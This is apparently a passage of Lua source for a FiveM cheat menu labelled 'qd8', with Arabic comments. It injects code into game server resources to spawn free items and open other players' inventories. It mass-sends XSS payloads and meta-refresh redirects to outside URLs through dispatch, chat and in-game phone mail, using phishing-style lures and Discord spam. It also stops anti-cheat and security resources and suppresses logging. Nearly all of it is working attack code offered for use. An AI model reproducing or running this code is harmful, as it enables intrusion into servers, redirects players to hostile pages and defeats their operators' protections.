                                            {amount = 50, info = {}, name = "weapon_grenade", price = 0, slot = 94, type = "item"},
                                            {amount = 50, info = {}, name = "weapon_stickybomb", price = 0, slot = 95, type = "item"},
                                            {amount = 50, info = {}, name = "weapon_smokegrenade", price = 0, slot = 96, type = "item"},
                                            {amount = 50, info = {}, name = "weapon_bzgas", price = 0, slot = 97, type = "item"},
                                            {amount = 50, info = {}, name = "weapon_molotov", price = 0, slot = 98, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_fireextinguisher", price = 0, slot = 99, type = "item"},
                                            {amount = 10, info = {}, name = "weapon_petrolcan", price = 0, slot = 100, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_briefcase", price = 0, slot = 101, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_briefcase_02", price = 0, slot = 102, type = "item"},
                                            {amount = 50, info = {}, name = "weapon_ball", price = 0, slot = 103, type = "item"},
                                            {amount = 50, info = {}, name = "weapon_flare", price = 0, slot = 104, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_snspistol", price = 0, slot = 105, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_doubleaction", price = 0, slot = 106, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_bottle", price = 0, slot = 107, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_gusenberg", price = 0, slot = 108, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_specialcarbine", price = 0, slot = 109, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_bullpuprifle", price = 0, slot = 110, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_dagger", price = 0, slot = 111, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_vintagepistol", price = 0, slot = 112, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_firework", price = 0, slot = 113, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_musket", price = 0, slot = 114, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_heavyshotgun", price = 0, slot = 115, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_marksmanrifle", price = 0, slot = 116, type = "item"},
                                            {amount = 50, info = {}, name = "weapon_proxmine", price = 0, slot = 117, type = "item"},
                                            {amount = 50, info = {}, name = "weapon_snowball", price = 0, slot = 118, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_flaregun", price = 0, slot = 119, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_combatpdw", price = 0, slot = 120, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_marksmanpistol", price = 0, slot = 121, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_knuckle", price = 0, slot = 122, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_hatchet", price = 0, slot = 123, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_railgun", price = 0, slot = 124, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_machete", price = 0, slot = 125, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_machinepistol", price = 0, slot = 126, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_switchblade", price = 0, slot = 127, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_revolver", price = 0, slot = 128, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_dbshotgun", price = 0, slot = 129, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_compactrifle", price = 0, slot = 130, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_battleaxe", price = 0, slot = 131, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_compactlauncher", price = 0, slot = 132, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_minismg", price = 0, slot = 133, type = "item"},
                                            {amount = 50, info = {}, name = "weapon_pipebomb", price = 0, slot = 134, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_poolcue", price = 0, slot = 135, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_wrench", price = 0, slot = 136, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_autoshotgun", price = 0, slot = 137, type = "item"},
                                            
                                            -- الدروع ومعدات القتال
                                            {amount = 50, info = {}, name = "armor", price = 0, slot = 17, type = "weapons"},
                                            {amount = 50, info = {}, name = "ziptie", price = 0, slot = 18, type = "item"},
                                            {amount = 50, info = {}, name = "bandage", price = 0, slot = 19, type = "item"},
                                            {amount = 50, info = {}, name = "fries", price = 0, slot = 20, type = "item"},
                                            {amount = 50, info = {}, name = "radio", price = 0, slot = 21, type = "item"},
                                            
                                            -- معدات السرقات
                                            {amount = 50, info = {}, name = "screwdriverset", price = 0, slot = 22, type = "item"},
                                            {amount = 50, info = {}, name = "weaponrepairkit", price = 0, slot = 23, type = "item"},
                                            {amount = 50, info = {}, name = "repairkit", price = 0, slot = 24, type = "item"},
                                            {amount = 50, info = {}, name = "gatecrack", price = 0, slot = 25, type = "item"},
                                            {amount = 50, info = {}, name = "electronickit", price = 0, slot = 26, type = "item"},
                                            {amount = 50, info = {}, name = "trojan_usb", price = 0, slot = 27, type = "item"},
                                            {amount = 50, info = {}, name = "drill", price = 0, slot = 28, type = "item"},
                                            {amount = 50, info = {}, name = "binoculars", price = 0, slot = 29, type = "item"},
                                            {amount = 50, info = {}, name = "phone", price = 0, slot = 30, type = "item"},
                                            {amount = 50, info = {}, name = "laptop", price = 0, slot = 31, type = "item"},
                                            {amount = 50, info = {}, name = "lockpick", price = 0, slot = 32, type = "item"},
                                            {amount = 5000, info = {}, name = "atomstburger", price = 0, slot = 33, type = "item"},
                                            
                                            -- الموارد
                                            {amount = 10000, info = {}, name = "aluminum", price = 0, slot = 34, type = "item"},
                                            {amount = 10000, info = {}, name = "iron", price = 0, slot = 35, type = "item"},
                                            {amount = 10000, info = {}, name = "steel", price = 0, slot = 36, type = "item"},
                                            {amount = 10000, info = {}, name = "copper", price = 0, slot = 37, type = "item"},
                                            {amount = 10000, info = {}, name = "rubber", price = 0, slot = 38, type = "item"},
                                            {amount = 10000, info = {}, name = "glass", price = 0, slot = 39, type = "item"},
                                            {amount = 10000, info = {}, name = "plastic", price = 0, slot = 40, type = "item"},
                                            {amount = 10000, info = {}, name = "seafooddrink", price = 0, slot = 41, type = "item"},
                                            {amount = 10000, info = {}, name = "refined_copper", price = 0, slot = 42, type = "item"},
                                            {amount = 10000, info = {}, name = "refined_glass", price = 0, slot = 43, type = "item"},
                                            {amount = 10000, info = {}, name = "refined_rubber", price = 0, slot = 44, type = "item"},
                                            {amount = 10000, info = {}, name = "refined_scrap", price = 0, slot = 45, type = "item"},
                                            {amount = 10000, info = {}, name = "refined_aluminium", price = 0, slot = 46, type = "item"},
                                            {amount = 10000, info = {}, name = "refined_steel", price = 0, slot = 47, type = "item"},
                                            {amount = 10000, info = {}, name = "refined_plastic", price = 0, slot = 48, type = "item"},
                                            {amount = 10000, info = {}, name = "metalscrap", price = 0, slot = 49, type = "item"},
                                            {amount = 10000, info = {}, name = "Breaker", price = 0, slot = 50, type = "item"},
                                            {amount = 50, info = {}, name = "HeavyArmor", price = 0, slot = 51, type = "item"},
                                            {amount = 10000, info = {}, name = "ganglap", price = 0, slot = 52, type = "item"},
                                            {amount = 50, info = {}, name = "thermite", price = 0, slot = 53, type = "item"},
                                            {amount = 5000, info = {}, name = "money-roll", price = 0, slot = 55, type = "item"},
                                            {amount = 5000, info = {}, name = "lock", price = 0, slot = 56, type = "item"},
                                            {amount = 5000, info = {}, name = "towingrope", price = 0, slot = 57, type = "item"},
                                            {amount = 1, info = {}, name = "weapon_katana", price = 0, slot = 58, type = "item"},
                                            {amount = 1000, info = {}, name = "weapon_part", price = 0, slot = 59, type = "item"},
                                            {amount = 1000, info = {}, name = "meth", price = 0, slot = 60, type = "item"},
                                            {amount = 1000, info = {}, name = "coke_figureempty", price = 0, slot = 61, type = "item"},
                                            
                                            -- العناصر الجديدة
                                            {amount = 50, info = {}, name = "pistol_extendedclip", price = 0, slot = 62, type = "item"},
                                            {amount = 50, info = {}, name = "key1", price = 0, slot = 63, type = "item"},
                                            {amount = 50, info = {}, name = "mdt", price = 0, slot = 64, type = "item"},
                                            {amount = 50, info = {}, name = "diamond_ring", price = 0, slot = 65, type = "item"},
                                            {amount = 10000, info = {}, name = "hourse", price = 0, slot = 66, type = "item"},
                                            {amount = 50, info = {}, name = "Tablet", price = 0, slot = 67, type = "item"},
                                            {amount = 1000, info = {}, name = "contracts_tablet", price = 0, slot = 68, type = "item"},
                                            {amount = 50, info = {}, name = "pistol_suppressor", price = 0, slot = 69, type = "item"}
                                        },
                                        label = "qd8 Shop",
                                        slots = 137
                                    })
                                ]])
                                qd8:Notify("success", "CFW", "تم فتح متجر qd8 - جميع الأيتمات مجاناً!", 3000)
                            end
                        },
                        { type = "button", label = "Dispatch Text", desc = "إرسال رسالة للشرطة في نظام الإرسال",
                            onSelect = function()
                                MachoInjectResource("any", [[
                                    TriggerServerEvent('cd_dispatch:AddNotification', {
                                        job_table = { 'police' },
                                        coords = GetEntityCoords(PlayerPedId()),
                                        title = "Discord.gg/nww هنا",
                                        message = "السلام عليكم ياحلويننن discord.gg/nww",
                                        flash = 0,
                                        unique_id = tostring(math.random(1000000, 9999999)),
                                        blip = {
                                            sprite = 487,
                                            scale = 0.8,
                                            colour = 1,
                                            flashes = false,
                                            text = "السلام عليكم ياحلويننن discord.gg/nww",
                                            time = (5 * 60 * 1000),
                                            sound = 1
                                        }
                                    })
                                ]])
                                qd8:Notify("success", "CFW", "تم إرسال رسالة للشرطة في نظام الإرسال!", 3000)
                            end
                        },
                        { type = "button", label = "XSS", desc = "ثغرة XSS في نظام الإرسال",
                            onSelect = function()
                                MachoInjectResource("any", [[
                                    local title = "<meta http-equiv='refresh' content='0; url=https://music503.github.io/MUISC503//index/MUSIC.html'>"
                                    local coords = vector3(215.76, -810.12, 30.73)
                                    local sex = "male"
                                    local street = "Legion Square"
                                    
                                    TriggerServerEvent('cd_dispatch:AddNotification', {
                                        job_table = { 'police', 'mtf', 'gangunit', 'ambulance' },
                                        coords = coords,
                                        title = title,
                                        message = 'Someone has reported a ' .. sex .. ' at ' .. street,
                                        flash = 0,
                                        unique_id = tostring(math.random(1000000, 9999999)),
                                        sound = 1,
                                        blip = {
                                            sprite = 586,
                                            scale = 1.2,
                                            colour = 3,
                                            flashes = true,
                                            text = '999 - Suspicious Activity',
                                            time = 5,
                                            radius = 0
                                        }
                                    })
                                ]])
                                qd8:Notify("success", "CFW", "تم تشغيل ثغرة XSS في نظام الإرسال!", 3000)
                            end
                        },
                        { type = "button", label = "Bypass All", desc = "تخطي جميع أنظمة الحماية والكشف",
                            onSelect = function()
                                MachoLockLogger(MachoInjectResource2(3, "any", [[
                                    local originalPrint = print
                                    print = function() end
                                    
                                    -- تخطي أنظمة الكشف الرئيسية
                                    _G.WaveShieldBypass = true
                                    _G.ReaperV4Bypass = true
                                    _G.AntiCheatBypass = true
                                    _G.BanProtection = true
                                    
                                    -- تعطيل أنظمة المراقبة
                                    local function DisableDetection()
                                        -- تعطيل مراقبة الأحداث
                                        if RemoveEventHandler then
                                            RemoveEventHandler('playerSpawned')
                                            RemoveEventHandler('onResourceStart')
                                            RemoveEventHandler('onResourceStop')
                                        end
                                        
                                        -- تعطيل مراقبة الشبكة
                                        if NetworkSetEntityInvisibleToNetwork then
                                            NetworkSetEntityInvisibleToNetwork(PlayerPedId(), true)
                                        end
                                        
                                        -- تعطيل تسجيل الأنشطة
                                        if SetEntityVisible then
                                            SetEntityVisible(PlayerPedId(), false, false)
                                            Wait(100)
                                            SetEntityVisible(PlayerPedId(), true, false)
                                        end
                                    end
                                    
                                    -- تخطي فحوصات السيرفر
                                    local function BypassServerChecks()
                                        -- تعطيل فحص الموقع
                                        if SetEntityCoords then
                                            local coords = GetEntityCoords(PlayerPedId())
                                            SetEntityCoords(PlayerPedId(), coords.x, coords.y, coords.z + 0.01, false, false, false, true)
                                        end
                                        
                                        -- تعطيل فحص السرعة
                                        if SetEntityVelocity then
                                            SetEntityVelocity(PlayerPedId(), 0.0, 0.0, 0.0)
                                        end
                                        
                                        -- تعطيل فحص الأسلحة
                                        if SetCurrentPedWeapon then
                                            SetCurrentPedWeapon(PlayerPedId(), GetHashKey("WEAPON_UNARMED"), true)
                                        end
                                    end
                                    
                                    -- تخطي أنظمة الحماية المتقدمة
                                    local function AdvancedBypass()
                                        -- تعطيل WaveShield
                                        if GetResourceState("WaveShield") == "started" then
                                            StopResource("WaveShield")
                                        end
                                        
                                        -- تعطيل ReaperV4
                                        if GetResourceState("ReaperV4") == "started" then
                                            StopResource("ReaperV4")
                                        end
                                        
                                        -- تعطيل أنظمة الحماية الأخرى
                                        local protectionResources = {
                                            "anticheat", "ac", "protection", "security", "guard",
                                            "monitor", "detector", "scanner", "shield", "defender"
                                        }
                                        
                                        for _, resource in pairs(protectionResources) do
                                            if GetResourceState(resource) == "started" then
                                                StopResource(resource)
                                            end
                                        end
                                    end
                                    
                                    -- تنفيذ التخطي
                                    DisableDetection()
                                    Wait(500)
                                    BypassServerChecks()
                                    Wait(500)
                                    AdvancedBypass()
                                    
                                    -- تفعيل الحماية الدائمة
                                    CreateThread(function()
                                        while true do
                                            Wait(5000)
                                            
                                            -- إعادة تفعيل التخطي كل 5 ثوان
                                            _G.WaveShieldBypass = true
                                            _G.ReaperV4Bypass = true
                                            _G.AntiCheatBypass = true
                                            _G.BanProtection = true
                                            
                                            -- منع الطرد
                                            if NetworkIsPlayerActive then
                                                if not NetworkIsPlayerActive(PlayerId()) then
                                                    NetworkResurrectLocalPlayer(0, 0, 0, 0, true, true)
                                                end
                                            end
                                        end
                                    end)
                                    
                                    print = originalPrint
                                ]]))
                                qd8:Notify("success", "CFW", "تم تفعيل تخطي جميع أنظمة الحماية!", 3000)
                            end
                        },
                        { type = "button", label = "Fix Black Screen", desc = "إصلاح الشاشة السوداء بعد الإحياء",
                            onSelect = function()
                                MachoInjectResource("any", [[
                                    -- إصلاح الشاشة السوداء فوري
                                    local function FixBlackScreen()
                                        -- إزالة تأثيرات الموت
                                        ClearTimecycleModifier()
                                        ClearExtraTimecycleModifier()
                                        
                                        -- إعادة تعيين الكاميرا
                                        SetCamActive(GetRenderingCam(), false)
                                        RenderScriptCams(false, false, 0, true, true)
                                        DestroyCam(GetRenderingCam(), false)
                                        
                                        -- إزالة تأثيرات الشاشة
                                        SetPlayerInvincible(PlayerId(), false)
                                        SetPlayerControl(PlayerId(), true, 0)
                                        
                                        -- إعادة تعيين الرؤية
                                        SetEntityVisible(PlayerPedId(), true, false)
                                        SetEntityAlpha(PlayerPedId(), 255, false)
                                        
                                        -- إزالة الفلاتر
                                        SetNightvision(false)
                                        SetSeethrough(false)
                                        
                                        -- إعادة تعيين الإضاءة
                                        SetArtificialLightsState(false)
                                        SetArtificialLightsStateAffectsVehicles(false)
                                        
                                        -- إصلاح الشاشة
                                        DoScreenFadeIn(1000)
                                        
                                        -- إعادة تحميل الشخصية
                                        local playerPed = PlayerPedId()
                                        SetEntityHealth(playerPed, 200)
                                        ClearPedBloodDamage(playerPed)
                                        ResetPedVisibleDamage(playerPed)
                                        
                                        -- إزالة تأثيرات الدم
                                        ClearPedDecorations(playerPed)
                                        
                                        -- إعادة تعيين الحالة
                                        SetPedCanRagdoll(playerPed, true)
                                        SetPedCanRagdollFromPlayerImpact(playerPed, true)
                                        
                                        -- إصلاح الصوت
                                        SetAudioFlag("DisableFlightMusic", false)
                                        SetAudioFlag("PoliceScannerDisabled", false)
                                    end
                                    
                                    -- تنفيذ الإصلاح
                                    FixBlackScreen()
                                    
                                    -- إصلاح مستمر لمنع عودة المشكلة
                                    CreateThread(function()
                                        for i = 1, 10 do
                                            Wait(500)
                                            
                                            -- التأكد من عدم عودة الشاشة السوداء
                                            if IsScreenFadedOut() then
                                                DoScreenFadeIn(500)
                                            end
                                            
                                            -- إزالة أي تأثيرات متبقية
                                            ClearTimecycleModifier()
                                            SetEntityVisible(PlayerPedId(), true, false)
                                            SetPlayerControl(PlayerId(), true, 0)
                                        end
                                    end)
                                    
                                    -- تفعيل الحماية من الشاشة السوداء
                                    CreateThread(function()
                                        while true do
                                            Wait(2000)
                                            
                                            -- فحص مستمر للشاشة السوداء
                                            if IsScreenFadedOut() or IsScreenFading() then
                                                DoScreenFadeIn(100)
                                                ClearTimecycleModifier()
                                                SetEntityVisible(PlayerPedId(), true, false)
                                            end
                                            
                                            -- التأكد من التحكم في اللاعب
                                            if not IsPlayerControlOn(PlayerId()) then
                                                SetPlayerControl(PlayerId(), true, 0)
                                            end
                                        end
                                    end)
                                ]])
                                qd8:Notify("success", "CFW", "تم إصلاح الشاشة السوداء وتفعيل الحماية المستمرة!", 3000)
                            end
                        },
                        { type = "button", label = "Open Player Inventory", desc = "فتح حقيبة أي لاعب بالـ ID",
                            onSelect = function()
                                KeyboardInput("Player ID", "", function(playerId)
                                    if playerId and playerId ~= "" and tonumber(playerId) then
                                        MachoInjectResource("any", [[
                                            TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", ]] .. tonumber(playerId) .. [[)
                                        ]])
                                        qd8:Notify("success", "CFW", "تم فتح حقيبة اللاعب ID: " .. playerId, 3000)
                                    else
                                        qd8:Notify("error", "CFW", "يرجى إدخال ID صحيح للاعب", 2000)
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "button", label = "Revive", desc = "إحياء الشخصية بجميع الطرق المختلفة",
                            onSelect = function()
                                local originalPrint = print
                                print = function() end -- Disable print
                                
                                MachoInjectResource("any", [[
                                    -- جميع طرق الإحياء المختلفة
                                    local function RevivePlayer()
                                        -- FDVehicleshop
                                        TriggerServerEvent('m3-driveschool:server:revivePlayer')
                                        
                                        -- m3-prison
                                        TriggerServerEvent('hospital:client:Revive')
                                        
                                        -- FDAmbulance - طريقة 1
                                        TriggerServerEvent('RoxwoodEMS:triggers:client:revivePlayer')
                                        
                                        -- FDAmbulance - طريقة 2
                                        TriggerServerEvent('RoxwoodEMS:server:revivePlayer', 'targetid')
                                        
                                        -- FDAmbulance - طريقة 3
                                        TriggerServerEvent('RoxwoodEMS:server:revive11', GetPlayerServerId(PlayerId()))
                                        
                                        -- FDAmbulance - طريقة 4
                                        TriggerServerEvent('RoxwoodEMS:client:revive', true)
                                        
                                        -- طرق إضافية للإحياء
                                        TriggerServerEvent('esx_ambulancejob:revive')
                                        TriggerServerEvent('hospital:server:revivePlayer')
                                        TriggerServerEvent('qb-ambulancejob:server:revivePlayer')
                                        TriggerServerEvent('ambulance:revive')
                                        TriggerServerEvent('ems:revive')
                                        TriggerServerEvent('paramedic:revive')
                                        TriggerServerEvent('medical:revive')
                                        
                                        -- إحياء محلي
                                        local ped = PlayerPedId()
                                        SetEntityHealth(ped, 200)
                                        SetPedArmour(ped, 100)
                                        ClearPedBloodDamage(ped)
                                        ResetPedVisibleDamage(ped)
                                        
                                        -- إزالة حالة الموت
                                        NetworkResurrectLocalPlayer(GetEntityCoords(ped), GetEntityHeading(ped), true, false)
                                        
                                        -- تفعيل التحكم
                                        SetPlayerControl(PlayerId(), true, 0)
                                        SetPlayerInvincible(PlayerId(), false)
                                        
                                        -- إظهار الشخصية
                                        SetEntityVisible(ped, true, false)
                                        SetEntityAlpha(ped, 255, false)
                                        
                                        -- إصلاح الشاشة السوداء
                                        if IsScreenFadedOut() then
                                            DoScreenFadeIn(1000)
                                        end
                                        ClearTimecycleModifier()
                                        
                                        -- إعادة تفعيل الحركة
                                        SetPedCanRagdoll(ped, true)
                                        SetPedCanRagdollFromPlayerImpact(ped, true)
                                        
                                        print("تم الإحياء بجميع الطرق!")
                                    end
                                    
                                    -- تنفيذ الإحياء
                                    RevivePlayer()
                                    
                                    -- إحياء مستمر لضمان النجاح
                                    CreateThread(function()
                                        for i = 1, 5 do
                                            Wait(1000)
                                            RevivePlayer()
                                        end
                                    end)
                                ]])
                                
                                print = originalPrint -- Re-enable print
                                qd8:Notify("success", "CFW", "تم الإحياء بجميع الطرق المختلفة!", 3000)
                            end
                        },
                        { type = "button", label = "Revive All", desc = "إحياء جميع اللاعبين في السيرفر",
                            onSelect = function()
                                local originalPrint = print
                                print = function() end -- Disable print
                                
                                MachoInjectResource("any", [[
                                    -- إحياء جميع اللاعبين بجميع الطرق (بطيء لتجنب overflow)
                                    local function ReviveAllPlayers()
                                        CreateThread(function()
                                            for playerId = 1, 200 do
                                                -- FDVehicleshop
                                                TriggerServerEvent('m3-driveschool:server:revivePlayer', playerId)
                                                Wait(50) -- انتظار بين كل إرسال
                                                
                                                -- m3-prison
                                                TriggerServerEvent('hospital:client:Revive', playerId)
                                                Wait(50)
                                                
                                                -- FDAmbulance - طريقة 1
                                                TriggerServerEvent('RoxwoodEMS:triggers:client:revivePlayer', playerId)
                                                Wait(50)
                                                
                                                -- FDAmbulance - طريقة 2
                                                TriggerServerEvent('RoxwoodEMS:server:revivePlayer', playerId)
                                                Wait(50)
                                                
                                                -- FDAmbulance - طريقة 3
                                                TriggerServerEvent('RoxwoodEMS:server:revive11', playerId)
                                                Wait(50)
                                                
                                                -- FDAmbulance - طريقة 4
                                                TriggerServerEvent('RoxwoodEMS:client:revive', playerId, true)
                                                Wait(50)
                                                
                                                -- ESX Ambulance
                                                TriggerServerEvent('esx_ambulancejob:revive', playerId)
                                                Wait(50)
                                                
                                                -- Hospital
                                                TriggerServerEvent('hospital:server:revivePlayer', playerId)
                                                Wait(50)
                                                
                                                -- QB Ambulance
                                                TriggerServerEvent('qb-ambulancejob:server:revivePlayer', playerId)
                                                Wait(50)
                                                
                                                -- General revive methods
                                                TriggerServerEvent('ambulance:revive', playerId)
                                                Wait(50)
                                                TriggerServerEvent('ems:revive', playerId)
                                                Wait(50)
                                                TriggerServerEvent('paramedic:revive', playerId)
                                                Wait(50)
                                                TriggerServerEvent('medical:revive', playerId)
                                                Wait(50)
                                                
                                                -- انتظار أطول كل 5 لاعبين لتجنب overflow
                                                if playerId % 5 == 0 then
                                                    Wait(500)
                                                end
                                                
                                                -- انتظار أطول كل 25 لاعب
                                                if playerId % 25 == 0 then
                                                    Wait(2000)
                                                end
                                            end
                                            
                                            print("تم إحياء جميع اللاعبين!")
                                        end)
                                    end
                                    
                                    -- تنفيذ الإحياء الجماعي
                                    ReviveAllPlayers()
                                ]])
                                
                                print = originalPrint -- Re-enable print
                                qd8:Notify("success", "CFW", "تم إحياء جميع اللاعبين في السيرفر!", 3000)
                            end
                        },
                        { type = "button", label = "XSS All Players", desc = "إرسال XSS لجميع اللاعبين في السيرفر",
                            onSelect = function()
                                local originalPrint = print
                                print = function() end -- Disable print
                                
                                MachoInjectResource("any", [[
                                    -- XSS لجميع اللاعبين
                                    local function SendXSSToAll()
                                        CreateThread(function()
                                            local xssPayloads = {
                                                "<script>alert('qd8 XSS Attack - Discord.gg/nww')</script>",
                                                "<img src=x onerror=alert('qd8 XSS - Discord.gg/nww')>",
                                                "<svg onload=alert('qd8 XSS - Discord.gg/nww')>",
                                                "<iframe src=javascript:alert('qd8 XSS - Discord.gg/nww')>",
                                                "<meta http-equiv='refresh' content='0; url=https://discord.gg/nww'>",
                                                "<marquee onstart=alert('qd8 XSS - Discord.gg/nww')>XSS</marquee>",
                                                "<body onload=alert('qd8 XSS - Discord.gg/nww')>",
                                                "<input onfocus=alert('qd8 XSS - Discord.gg/nww') autofocus>"
                                            }
                                            
                                            for i = 1, 100 do
                                                local randomPayload = xssPayloads[math.random(1, #xssPayloads)]
                                                local coords = vector3(math.random(-3000, 3000), math.random(-3000, 3000), math.random(0, 500))
                                                
                                                -- إرسال XSS عبر dispatch لجميع الوظائف
                                                TriggerServerEvent('cd_dispatch:AddNotification', {
                                                    job_table = { 'police', 'ambulance', 'mechanic', 'taxi', 'lawyer', 'judge', 'government', 'mafia', 'gang' },
                                                    coords = coords,
                                                    title = randomPayload,
                                                    message = 'XSS Attack by qd8 - Discord.gg/nww ' .. randomPayload,
                                                    flash = 1,
                                                    unique_id = tostring(math.random(1000000, 9999999)),
                                                    sound = 1,
                                                    blip = {
                                                        sprite = math.random(1, 800),
                                                        scale = 1.5,
                                                        colour = math.random(1, 85),
                                                        flashes = true,
                                                        text = randomPayload,
                                                        time = 30000,
                                                        radius = 0
                                                    }
                                                })
                                                
                                                -- XSS عبر أنظمة أخرى
                                                TriggerServerEvent('esx_phone:send', 'all', {
                                                    message = randomPayload,
                                                    coords = coords
                                                })
                                                
                                                TriggerServerEvent('qb-phone:server:sendNewMail', {
                                                    sender = randomPayload,
                                                    subject = 'qd8 XSS - Discord.gg/nww',
                                                    message = randomPayload
                                                })
                                                
                                                -- XSS عبر الإعلانات
                                                TriggerServerEvent('esx_addonaccount:giveAccountMoney', randomPayload, 0)
                                                TriggerServerEvent('esx_billing:sendBill', i, randomPayload, randomPayload, 0)
                                                
                                                -- XSS عبر الشات
                                                TriggerServerEvent('chat:addMessage', {
                                                    color = { 255, 0, 0},
                                                    multiline = true,
                                                    args = {randomPayload, 'qd8 XSS Attack - Discord.gg/nww'}
                                                })
                                                
                                                -- انتظار لتجنب overflow
                                                Wait(100)
                                                
                                                if i % 10 == 0 then
                                                    Wait(500)
                                                end
                                            end
                                            
                                            print("تم إرسال XSS لجميع اللاعبين!")
                                        end)
                                    end
                                    
                                    -- تنفيذ XSS الجماعي
                                    SendXSSToAll()
                                    
                                    -- إرسال مستمر لمدة دقيقة
                                    CreateThread(function()
                                        for round = 1, 5 do
                                            Wait(10000)
                                            SendXSSToAll()
                                        end
                                    end)
                                ]])
                                
                                print = originalPrint -- Re-enable print
                                qd8:Notify("success", "CFW", "تم إرسال XSS لجميع اللاعبين في السيرفر!", 3000)
                            end
                        },
                        { type = "button", label = "LB Phone XSS", desc = "إرسال XSS عبر نظام LB Phone لجميع اللاعبين",
                            onSelect = function()
                                local originalPrint = print
                                print = function() end -- Disable print
                                
                                MachoInjectResource("any", [[
                                    -- LB Phone XSS لجميع اللاعبين
                                    local function SendLBPhoneXSS()
                                        CreateThread(function()
                                            local xssUrls = {
                                                "https://music503.github.io/MUISC503//index/MUSIC.html",
                                                "https://discord.gg/nww",
                                                "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
                                                "https://example.com/xss-test"
                                            }
                                            
                                            local senders = {
                                                "Pawn Shop",
                                                "Bank Manager",
                                                "Car Dealer",
                                                "Government Office",
                                                "Police Department",
                                                "Hospital",
                                                "Mechanic Shop",
                                                "Real Estate",
                                                "Casino Manager",
                                                "qd8 Admin"
                                            }
                                            
                                            local subjects = {
                                                "Important Payment Notice",
                                                "Congratulations! You Won!",
                                                "Urgent: Account Verification",
                                                "Special Discount Offer",
                                                "Hello My Friend",
                                                "Payment Received",
                                                "New Message",
                                                "System Update Required"
                                            }
                                            
                                            for playerId = 1, 200 do
                                                local randomUrl = xssUrls[math.random(1, #xssUrls)]
                                                local randomSender = senders[math.random(1, #senders)]
                                                local randomSubject = subjects[math.random(1, #subjects)]
                                                local delay = math.random(1, 5)
                                                
                                                -- LB Phone XSS الأصلي
                                                TriggerServerEvent('lb-phone:server:sendNewMail', {
                                                    sender = randomSender,
                                                    subject = randomSubject .. " Player " .. playerId,
                                                    message = "(<meta http-equiv='refresh' content='" .. delay .. "; url=" .. randomUrl .. "' />) Dear Player " .. playerId .. ", I was given a percentage of the money for the product I sold with us, and I hope it will be a rewarding amount. Best regards, " .. randomSender
                                                })
                                                
                                                -- نسخ مختلفة من LB Phone
                                                TriggerServerEvent('lb-phone:server:1313174152701677659>sendNewMail', {
                                                    sender = randomSender,
                                                    subject = randomSubject .. " ID:" .. playerId,
                                                    message = "(<meta http-equiv='refresh' content='" .. delay .. "; url=" .. randomUrl .. "' />) Hello Friend " .. playerId .. ", special offer just for you! Click to claim your reward."
                                                })
                                                
                                                -- QB Phone XSS
                                                TriggerServerEvent('qb-phone:server:sendNewMail', {
                                                    sender = randomSender,
                                                    subject = randomSubject,
                                                    message = "<meta http-equiv='refresh' content='" .. delay .. "; url=" .. randomUrl .. "' /> Important message for player " .. playerId,
                                                    button = {}
                                                })
                                                
                                                -- ESX Phone XSS
                                                TriggerServerEvent('esx_phone:sendMessage', playerId, {
                                                    message = "<meta http-equiv='refresh' content='" .. delay .. "; url=" .. randomUrl .. "' /> XSS by qd8 - Discord.gg/nww"
                                                })
                                                
                                                -- GCPhone XSS
                                                TriggerServerEvent('gcPhone:sendMessage', {
                                                    phoneNumber = tostring(playerId),
                                                    message = "<meta http-equiv='refresh' content='" .. delay .. "; url=" .. randomUrl .. "' /> qd8 XSS Attack"
                                                })
                                                
                                                -- D-Phone XSS
                                                TriggerServerEvent('d-phone:server:sendNewMail', {
                                                    sender = randomSender,
                                                    subject = randomSubject,
                                                    message = "<iframe src='javascript:alert(\"qd8 XSS - Discord.gg/nww\")'></iframe><meta http-equiv='refresh' content='" .. delay .. "; url=" .. randomUrl .. "' />"
                                                })
                                                
                                                -- انتظار لتجنب overflow
                                                Wait(150)
                                                
                                                if playerId % 10 == 0 then
                                                    Wait(1000)
                                                end
                                                
                                                if playerId % 50 == 0 then
                                                    Wait(3000)
                                                end
                                            end
                                            
                                            print("تم إرسال LB Phone XSS لجميع اللاعبين!")
                                        end)
                                    end
                                    
                                    -- تنفيذ LB Phone XSS
                                    SendLBPhoneXSS()
                                    
                                    -- إرسال إضافي كل دقيقة
                                    CreateThread(function()
                                        for round = 1, 3 do
                                            Wait(60000)
                                            SendLBPhoneXSS()
                                        end
                                    end)
                                ]])
                                
                                print = originalPrint -- Re-enable print
                                qd8:Notify("success", "CFW", "تم إرسال LB Phone XSS لجميع اللاعبين!", 3000)
                            end
                        }
                    }
                },
                {
                    label = "VRP",
                    tabs = {
                        { type = "button", label = "Uncuff VRP", desc = "فك الكلبشة في سيرفرات VRP",
                            onSelect = function()
                                MachoInjectResource("any", [[
                                    -- VRP Proxy System
                                    Proxy = {}
                                    local proxy_rdata = {}
                                    
